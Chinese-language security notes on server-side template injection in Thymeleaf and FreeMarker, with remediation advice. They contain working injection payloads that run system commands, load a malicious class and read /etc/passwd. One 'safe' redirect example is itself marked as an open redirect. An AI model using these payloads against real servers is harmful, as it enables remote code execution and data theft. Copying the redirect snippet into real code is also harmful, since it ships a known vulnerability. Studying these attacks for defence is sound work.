
Velocity、FreeMarker以及Thymeleaf三个模板注入。
<https://forum.butian.net/share/1661>
<https://www.cnblogs.com/LittleHann/p/17846825.html#_label1>

SSTI:Server Side Template Injection，即服务端模板注入。
在Web开发中，为了使用户界面与业务数据分离，提升开发效率，因此会使用模板引擎来生成一个标准的HTML文档用来数据的展示。
作为视图层，常见于前后端不分离的项目。

## **Thymeleaf模板注入**
```
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}__::.x

__${T(java.lang.Runtime).getRuntime().exec("calc")}__::feng
```


####  **修复方案**
1. 设置ResponseBody注解
如果设置`ResponseBody`，则不再调用模板解析

2. 设置redirect重定向
```
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; //CWE-601, as we can control the hostname in redirect
```
根据spring boot定义，如果名称以`redirect:`开头，则不再调用`ThymeleafView`解析，调用`RedirectView`去解析`controller`的返回值

3. response
```
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    log.info("Retrieving " + document); //FP
}
```
由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析



^
## **Freemarker模板注入**
引入并使用Freemarker模板就可能存在注入
<https://tttang.com/archive/1412/#toc_api>

通过使用内置函数new，可创建任意实现了`TemplateModel`接口的Java对象，借助`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类可以实现RCE：

```
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc")</@value>
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","open -a Calculator").start()}
```
或者使用内置的api函数来调用恶意类、读取文件：
```
<#assign classLoader=object?api.class.getClassLoader()>${classLoader.loadClass("Evil.class")}

<#assign uri=object?api.class.getResource("/").toURI()>
  <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>
  <#assign is=input?api.getInputStream()>
  FILE:[<#list 0..999999999 as _>
      <#assign byte=is.read()>
      <#if byte == -1>
          <#break>
      </#if>
  ${byte}, </#list>]
```

#### **漏洞修复**

通过setNewBuiltinClassResolver(TemplateClassResolver.SAFER\_RESOLVER)来设置解析规则：

1、UNRESTRICTED\_RESOLVER：可以通过 `ClassUtil.forName(className)` 获取任何类。 
2、SAFER\_RESOLVER：不能加载 `freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类。 
3、ALLOWS\_NOTHING\_RESOLVER：不能解析任何类。 可通过`freemarker.core.Configurable#setNewBuiltinClassResolver`方法设置`TemplateClassResolver`，从而限制通过`new()`函数对`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类的解析。



